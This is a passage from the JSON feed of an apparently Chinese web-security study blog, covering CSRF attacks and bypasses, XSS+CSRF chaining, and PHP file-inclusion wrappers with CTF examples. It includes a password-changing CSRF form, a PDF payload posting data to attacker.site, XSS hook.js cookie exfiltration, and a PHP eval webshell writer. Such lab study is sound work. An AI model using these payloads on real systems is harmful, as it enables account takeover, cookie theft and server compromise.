class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> count = <span class=\"number\">1</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;count; i++)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[i].<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">pausecomp</span>(pauses[i]);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">H2</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">H2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;GET&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;form0&quot;</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://10.128.50.84:18888/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;value&quot;</span>/&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将它放在我的服务器上： <code>(http://101.35.139.208:9999/shabi233.html)</code></p>\n<p>再以同样的方式生成短链接： <code>http://gg.gg/12ivbn</code></p>\n<p>访问后密码就会被修改</p>\n<h2 id=\"csrf-防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf-防御\">#</a> CSRF 防御</h2>\n<p>1. 在请求地址中添加 token 验证</p>\n<input type=\"hidden\" name=\"token\" value=\"\">\n<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，可以在用户登录后放入 session 中，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>\n<p>2. 添加 referer 认证</p>\n<p>如果是以网站 WebA 的网址开头的域名，则说明该请求是来自 WebA 自己的请求，是合法的。</p>\n<p>但 referer 可以伪造</p>\n<p>3. 限制跨域</p>\n<p>阻止不明外域的访问，使用 json api</p>\n<p>使用 JavaScript 发起 AJAX 请求是限制跨域的，并不能通过简单的表单来发送 JSON，所以，通过只接收 JSON 可以很大可能避免 CSRF 攻击。</p>\n<ul>\n<li>同源检测</li>\n<li>Samesite Cookie</li>\n</ul>\n<p>4. 修改密码时需要原密码</p>\n<h2 id=\"csrf绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf绕过\">#</a> CSRF 绕过</h2>\n<p>1.referer 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.置空：删除referer内容</span><br><span class=\"line\">2.子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 https://baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了</span><br><span class=\"line\">3.修改域名：https://adafsec.weiyigeek.org https://0dafsec.weiyigeek.org https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法</span><br><span class=\"line\">4.参数： https://weiyigeek.org/?https://dafsec.org</span><br></pre></td></tr></table></figure>\n<p>2. 删除 X-CSRFToken 报头然后将 POST 请求改为 GET</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用POST和删除“X-CSRFToken”报头测试成功-构造PoC以GET请求来修改邮箱-成功CSRF攻击后利用修改后邮箱重置密码</span><br></pre></td></tr></table></figure>\n<p>3.Use Bad PDF</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FormCalc的get()和post()方法允许过滤CSRF-token,其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token </span><br><span class=\"line\">&lt;script contentType=&#x27;application/x-formcalc&#x27;&gt;</span><br><span class=\"line\">  var content = GET(&quot;https://example.com/Settings.action&quot;); </span><br><span class=\"line\">  Post(&quot;http://attacker.site/loot&quot;,content,&quot;text/plain&quot;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>旁路 cookie 注入绕过</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">描述:攻击者可以通过cookie注入绕过双重提交cookie保护 cookie注入的方法:</span><br><span class=\"line\"></span><br><span class=\"line\">- CRLF-injection (HTML响应拆分注入漏洞)</span><br><span class=\"line\">- Browser bugs (like CVE-2016-9078 in Firefox)</span><br></pre></td></tr></table></figure>\n<p>5.Content-Type 绕过方法</p>\n<p>描述：该类漏洞主要是利用的程序后端没有验证 (Calidate) <code>Content-Type</code>  头；攻击者只能通过 HTML 表单或 XHR api 发送 “简单” 的内容类型:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* text/plain</span><br><span class=\"line\">* application/x-www-form-urlencoded</span><br><span class=\"line\">* multipart/form-dat</span><br></pre></td></tr></table></figure>\n<h2 id=\"xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#xss-csrf\">#</a> xss + csrf</h2>\n<p>selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。</p>\n<h4 id=\"stored-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#stored-xss-csrf\">#</a> stored xss + csrf</h4>\n<p>即同时存在 xss 和 csrf 的地方</p>\n<p>思路是：在 xss 中插入我们构造的 csrf 的恶意代码的连接，一旦用户访问，我们就可以跳转到 csrf 页面干一些见不得人的事</p>\n<p>1. 使用前面提到过的 csrftester 生成一个 payload，放在自己的服务器上，比如我的服务器为 1.1.1.1，生成的 payload 名字是 haha.html，放在网站根目录下，那么此时完整路径为 <code>1.1.1.1/haha.html</code></p>\n<p>2. 在 stroed xss 处插入： <code>&lt;script src=&quot;x&quot; onerror=javascript:window.open(&quot;http://1.1.1.1/haha.html&quot;)&gt;&lt;/script&gt;</code></p>\n<p>3. 用户一旦访问，我们 haha.html 中的 csrf 恶意代码就会被执行</p>\n<h4 id=\"self-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#self-xss-csrf\">#</a> self-xss + csrf</h4>\n<p>selfxss 一般只能获取自己的 cookie，但结合 csrf，我们可以获取别人的 cookie。我们在 input 中提交的是 hook.js，用户一旦点击，相当于让别人触发这个 js，cookie 被外带到平台，而 selfxss 则是自己触发 js</p>\n<p>1. 首先准备一个 xss 平台，使用它他提供的 payload： <code>&lt;script src=&quot;http://192.168.38.129:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>2. 使用 csrftester 生成我们的 payload，payload 路径和名称参考前一个 <code>1.1.1.1/haha.html</code> ，但此时 payload 需要做一些修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form method=&quot;GET&quot; name=&quot;form0&quot; action=&quot;http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;&gt;</span><br><span class=\"line\">&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;/&gt; </span><br></pre></td></tr></table></figure>\n<p>3. 用户登录账户，点击我们的链接，我们就能在 xss 平台看到他的 cookie 了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoLm1laXR1YW4uY29tLzIwMTgvMTAvMTEvZmUtc2VjdXJpdHktY3NyZi5odG1s\">前端安全系列（二）：如何防止 CSRF 攻击？ - 美团技术团队 (meituan.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NDA2OS5odG1s\">鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM0MTU5MS5odG1s\">CSRF 入门及靶场实战 - FreeBuf 网络安全行业门户</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/17/include/",
            "url": "http://example.com/2022/05/17/include/",
            "title": "file include",
            "date_published": "2022-05-17T05:38:45.000Z",
            "content_html": "<h1 id=\"file-include\"><a class=\"markdownIt-Anchor\" href=\"#file-include\">#</a> file include</h1>\n<blockquote>\n<p>来自 pikachu 的介绍：</p>\n<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>\ninclude(),include_once()<br>\nrequire(),require_once()<br>\n 这些文件包含函数，这些函数在代码设计中被经常使用到。</p>\n<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>\n**1. 本地文件包含漏洞：** 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>\n**2. 远程文件包含漏洞：** 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>\n<p>因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>\n</blockquote>\n<h2 id=\"php伪协议\"><a class=\"markdownIt-Anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n<p>文件包含函数 (php):</p>\n<blockquote>\n<p>include</p>\n<p>include_once</p>\n<p>require</p>\n<p>require_one</p>\n<p>nclude 与 require 基本是相同的，除了错误处理方面:</p>\n<ul>\n<li>\n<p>include ()，只生成警告（E_WARNING），并且脚本会继续</p>\n</li>\n<li>\n<p>require ()，会生成致命错误（E_COMPILE_ERROR）并停止脚本</p>\n</li>\n<li>\n<p>include_once () 与 require ()_once ()，如果文件已包含，则不会包含，其他特性如上</p>\n</li>\n</ul>\n</blockquote>\n<p>直接包含 php，html 文件会直接执行，对于 txt 文件或者 linux 下普通文件，可以直接读取</p>\n<p>对于 php 伪协议，使用时需要注意 allow_url_open 和 allow_url_include ，有些伪协议会对此有限制，有些没有</p>\n<h4 id=\"1file协议\"><a class=\"markdownIt-Anchor\" href=\"#1file协议\">#</a> 1.file 协议</h4>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p><code>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</code></p>\n<h4 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> 2.php://filter</h4>\n<p>读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<blockquote>\n<p>?file=php://filter/read=convert.base64-encode/resource=web1.php</p>\n<p>?file=php://filter/write=convert.base64-decode/resource=web1.php</p>\n</blockquote>\n<h4 id=\"3phpinput\"><a class=\"markdownIt-Anchor\" href=\"#3phpinput\">#</a> 3.php://input</h4>\n<p>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。http 方法为 get 时并不影响 input 接收 post 参数</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on</p>\n<p>当然也可以在 post 中写入一句话木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;');?&gt;</code></p>\n<p>可以配合 file_get_contents 读文件或者 system 执行系统命令，或者写马</p>\n<h4 id=\"4zipbzip2-zlib\"><a class=\"markdownIt-Anchor\" href=\"#4zipbzip2-zlib\">#</a> 4.zip://,bzip2://, zlib://</h4>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<h5 id=\"41-zip\"><a class=\"markdownIt-Anchor\" href=\"#41-zip\">#</a> 4.1 zip://</h5>\n<p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>\n<p><code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code></p>\n<p>如果网站限制，可以将后缀改为 jgp，仍可以解析</p>\n<p>需要将 #进行 url 编码</p>\n<h5 id=\"42-bzip2\"><a class=\"markdownIt-Anchor\" href=\"#42-bzip2\">#</a> 4.2 bzip2://</h5>\n<p><code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h5 id=\"43-zlib\"><a class=\"markdownIt-Anchor\" href=\"#43-zlib\">#</a> 4.3 zlib://</h5>\n<p><code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h4 id=\"5data\"><a class=\"markdownIt-Anchor\" href=\"#5data\">#</a> 5.data://</h4>\n<p>allow_url_open=on</p>\n<p>allow_url_include=on</p>\n<p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>\n<p><code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png?x-oss-process=image%2Fresize%2Cw_889%2Climit_0%2Fresize%2Cw_889%2Climit_0\" alt=\"img\"></p>\n<h3 id=\"一些小题目\"><a class=\"markdownIt-Anchor\" href=\"#一些小题目\">#</a> 一些小题目</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&#x27;hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tif ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &#x27;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//file=php://input  &lt;post&gt; &lt;?php system(&#x27;dir&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a= $_GET[&quot;a&quot;];</span><br><span class=\"line\">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class=\"line\">\techo &quot;success\\n&quot;;</span><br><span class=\"line\">\techo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//a=php://input    &lt;post&gt; I want flag</span><br><span class=\"line\">//file_get_contents可以读取input流</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;</span><br><span class=\"line\">if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;</span><br><span class=\"line\">\techo &quot;hack?&quot;;</span><br><span class=\"line\">\texit();</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgi-fast-cgiphp-fpm\"><a class=\"markdownIt-Anchor\" href=\"#cgi-fast-cgiphp-fpm\">#</a> CGI、FAST CGI，PHP FPM</h2>\n<p>CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>\n<p>FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理</p>\n<p>PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>\n<p>PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png\" alt=\"image-20221105160625653\"></p>\n<p>Apache/nginx 加载 php：</p>\n<p>1. 通过 so 模块加载</p>\n<p>2. 通过 fpm</p>\n<p>3. 通过 cgi</p>\n<p>最佳方式是 apache/Nginx + fastcgi + php fpm</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png\" alt=\"image-20221105161200210\" style=\"zoom:67%;\" />\n<p>因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现</p>\n<p>web 中间件和 phpfpm 的通信方式有两种</p>\n<p>1.socket</p>\n<p>2.TCP 模式</p>\n<p>fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端</p>\n<p>可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节</p>\n<p>recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对</p>\n<p>type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png\" alt=\"image-20221105164011830\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png\" alt=\"image-20221105164219506\"></p>\n<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record</p>\n<p>当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php</p>\n<p>php-Cgi:</p>\n<p>1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&gt; 根据请求参数，返回处理结果</p>\n<p>2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低</p>\n<p>3）修改完 php.ini 文件，启动 php-Cgi 程序不会生效，无法平滑重启</p>\n<h2 id=\"日志包含\"><a class=\"markdownIt-Anchor\" href=\"#日志包含\">#</a> 日志包含</h2>\n<p>一般日志位置 /var/log/httpd/access.log</p>\n<p><strong>将木马写到日志中，知道日志文件名与路径，存在文件包含漏洞</strong></p>\n<p>首先在 url 中写入自己想要执行的内容，比如 <code>127.0.0.1/inlcude?&lt;?php phpinfo(); ?&gt;</code></p>\n<p>但 url 中会被编码，导致无法包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:08 +0800] &quot;GET /html/html/flag.php HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:33:19 +0800] &quot;GET /html/html/flag.php?%3C?php%20phpinfo();%20?%3E HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以通过抓包，修改为未编码的形式</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030163914509.png\" alt=\"image-20221030163914509\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在包含日志文件即可</p>\n<p>防止文件包含：文件名包含随机数，定期分割文件，更改日志路径</p>\n<p>如果是 bt 面板搭建的，记得关掉 open_basedir</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165251590.png\" alt=\"image-20221030165251590\" style=\"zoom:80%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165348749.png\" alt=\"image-20221030165348749\" style=\"zoom:67%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzYwNTM2NDg=\">open_basedir restriction in effect. 原因与解决方法 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"session包含\"><a class=\"markdownIt-Anchor\" href=\"#session包含\">#</a> session 包含</h2>\n<p>前置知识～:cookie 与 session，这个我在 xss 的开头讲过了</p>\n<p>session 目录:/var/llib/php/session</p>\n<p>文件格式:sess_sessid</p>\n<p><strong>知道 session 的路径，可以控制 session 文件中的内容，存在文件包含</strong></p>\n<p><strong>session 常见存储路径：</strong></p>\n<ul>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/var/lib/php/sess_PHPSESSID</li>\n<li>/tmp/sess_PHPSESSID</li>\n<li>/tmp/sessions/sess_PHPSESSID</li>\n<li>session 文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>\n</ul>\n<h4 id=\"一道ctf关于session包含的题目\"><a class=\"markdownIt-Anchor\" href=\"#一道ctf关于session包含的题目\">#</a> 一道 CTF 关于 session 包含的题目</h4>\n<p>页面打开之后有 login 和 register 选项，并且点击后 url 长这样:</p>\n<p><code>http://1.1.1.1/index.php?action=login.php</code>   <code>http://1.1.1.1/index.php?action=register.php</code></p>\n<p>很明显，这是通过 include 不同的文件加载不同的页面</p>\n<p>那么就有可能存在文件包含漏洞了</p>\n<p>尝试用 php://filter 读源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//login.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span 